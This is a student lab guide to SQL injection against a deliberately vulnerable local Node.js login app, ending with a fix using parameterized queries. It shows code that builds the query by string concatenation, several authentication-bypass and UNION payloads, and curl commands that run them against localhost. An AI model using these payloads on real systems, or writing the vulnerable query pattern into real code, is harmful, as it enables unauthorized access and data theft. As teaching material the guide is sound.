# SQL Injection Vulnerability Lab - Student Guide

## What is SQL Injection?

**SQL Injection** is a security vulnerability where an attacker inserts malicious SQL code into input fields. This malicious code gets executed by the database, allowing attackers to:
- Bypass authentication (login without valid credentials)
- Read unauthorized data
- Modify or delete data
- Execute administrative operations

### Why does it happen?
When applications **concatenate user input directly into SQL queries** without sanitization or validation, attackers can inject SQL commands that alter the query's logic.

---

## Step 1: Understanding the Vulnerable Code

The vulnerable code in `server.js` (lines 76-83) looks like this:

```javascript
// VULNERABLE: Direct string concatenation (SQL Injection)
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

db.get(query, (err, row) => {
  // ... handle response
});
```

### Why is this vulnerable?
The code directly inserts `${username}` and `${password}` into the SQL query **without any validation or escaping**. If a user enters special characters or SQL code, it becomes part of the actual query.

### Your Task:
Run the application locally:
```bash
npm install
npm start
```

Access the login page at `http://localhost:3000/login`

---

## Step 2: How SQL Queries Work & Exploiting

Let's understand what the legitimate SQL query looks like:

**Normal Login (valid credentials):**
- Username: `admin`
- Password: `admin123`

The generated query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'admin123'
```

This returns the admin user ✅

**Now let's inject malicious SQL:**

### Payload 1: Comment-based bypass
- **Username:** `admin' --`
- **Password:** `anything`

Generated query:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
```

The `--` **comments out everything after it**, so the password check is ignored! ✅

### Payload 2: OR-based bypass
- **Username:** `' OR '1'='1`
- **Password:** `' OR '1'='1`

Generated query:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

Since `'1'='1'` is **always true**, the WHERE clause matches ANY user (usually returns the first one). ✅

### Payload 3: UNION-based attack (advanced)
- **Username:** `admin' UNION SELECT * FROM users --`
- **Password:** `anything`

This **combines results** from multiple SELECT statements.

---

## Step 3: Constructing SQL Injection Queries

### Template for Building Payloads:

**Original Query:**
```sql
SELECT * FROM users WHERE username = 'INPUT1' AND password = 'INPUT2'
```

**Attack Strategies:**

#### Strategy 1: Comment Everything Out
```
username: ' --
password: anything
Result: SELECT * FROM users WHERE username = '' -- AND password = 'anything'
```

#### Strategy 2: OR Logic
```
username: ' OR '1'='1
password: ' OR '1'='1
Result: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

#### Strategy 3: Always True Condition
```
username: admin' OR 'x'='x
password: anything
Result: SELECT * FROM users WHERE username = 'admin' OR 'x'='x' AND password = 'anything'
```

#### Strategy 4: Break the Logic
```
username: ' OR 1=1 --
password: anything
Result: SELECT * FROM users WHERE username = '' OR 1=1 -- AND password = 'anything'
```

---

## Step 4: Exploiting on the Website

### Using the Web Browser:

1. Open `http://localhost:3000/login`
2. Try these payloads in the **Username** field:

| Payload | Password | Expected Result |
|---------|----------|-----------------|
| `admin' --` | `anything` | Login as admin ✅ |
| `' OR '1'='1` | `anything` | Login (first user) ✅ |
| `admin' OR '1'='1` | `test` | Login as admin ✅ |
| `user1' --` | `x` | Login as user1 ✅ |

### Using curl (Command Line):

```bash
# Comment bypass
curl -d "username=admin' --&password=test" http://localhost:3000/login -v

# OR bypass
curl -d "username=' OR '1'='1&password=' OR '1'='1" http://localhost:3000/login -v

# Check response for redirect to /dashboard (indicates successful login)
```

### Using Browser DevTools:

1. Open Developer Tools (F12)
2. Go to **Network** tab
3. Fill the login form with a payload
4. Click Login
5. Watch the POST request in the Network tab
6. You should see a **302 redirect** to `/dashboard` (means successful login!)

---

## Step 5: Getting Admin Access

### Admin Credentials (Hardcoded in server.js):
- **Username:** `admin`
- **Password:** `admin123`

But let's get admin access **without knowing the password**:

### Method 1: Direct Admin Bypass
```
Username: admin' --
Password: anything
```
Click Login → You're logged in as **admin** ✅

### Verify You're Admin:
1. After logging in, click "Profile"
2. You should see a **⭐ Administrator** badge
3. You should see a link to the **Admin Panel**

### Access Admin Panel:
1. Click "Admin Panel" link (only visible to admins)
2. You can see all users in the system
3. You can delete user accounts
4. You're now an authenticated administrator! 🎯

### What an Admin Can Do:
- View all user accounts
- Delete users
- Access sensitive user data (emails, names, etc.)

---

## Step 6: Fixing the Code (Remediation)

### The Vulnerable Code (WRONG ❌):
```javascript
// VULNERABLE: Direct string concatenation
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.get(query, (err, row) => { ... });
```

### The Secure Code (RIGHT ✅):
```javascript
// SECURE: Using parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.get(query, [username, password], (err, row) => { ... });
```

### Why This Works:

With **parameterized queries** (also called **prepared statements**):
- The SQL structure is defined FIRST
- User input is inserted AFTER the query structure is parsed
- The database treats user input as **DATA ONLY**, not as executable code
- Even if the user enters `admin' --`, it's treated as a literal string value

### Example:
```
Input: admin' --
Query: SELECT * FROM users WHERE username = ? AND password = ?
Result: Treated as literal string "admin' --", not as SQL code
```

### Changes Required in server.js:
1. **Line 81:** Change the query construction
2. **Line 83:** Pass parameters as an array to `db.get()`

### Lab Completion:
After making these changes:
1. Restart the server
2. Try the SQL injection payloads again
3. **They won't work anymore** ✅
4. Only valid credentials will work
5. Login with: `admin` / `admin123` should work normally

---

## Summary

| Step | Goal | Outcome |
|------|------|---------|
| 1 | Understand vulnerable code | Identified direct string concatenation |
| 2 | Learn how SQL injection works | Discovered comment (`--`) and OR (`'1'='1`) bypasses |
| 3 | Construct payloads | Built custom SQL injection queries |
| 4 | Exploit on website | Successfully bypassed authentication |
| 5 | Gain admin access | Logged in as administrator without password |
| 6 | Fix vulnerability | Implemented parameterized queries |

---

## Key Takeaways

✅ **Always use parameterized queries / prepared statements**
✅ **Never concatenate user input directly into SQL**
✅ **Validate and sanitize all user inputs**
✅ **Use ORM frameworks that handle escaping automatically**
✅ **Apply principle of least privilege to database accounts**

---

## Additional Challenges (Optional)

1. **Try other users:** Use SQL injection to login as `user1`, `user2`, `user3`
2. **Extract password hashes:** Modify payloads to dump user data using UNION SELECT
3. **Bypass other forms:** Check if other parts of the app have injection vulnerabilities
4. **Time-based injection:** Experiment with time delays to extract data character-by-character

---

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQLite Query Language](https://www.sqlite.org/lang.html)
- [Prepared Statements](https://en.wikipedia.org/wiki/Prepared_statement)
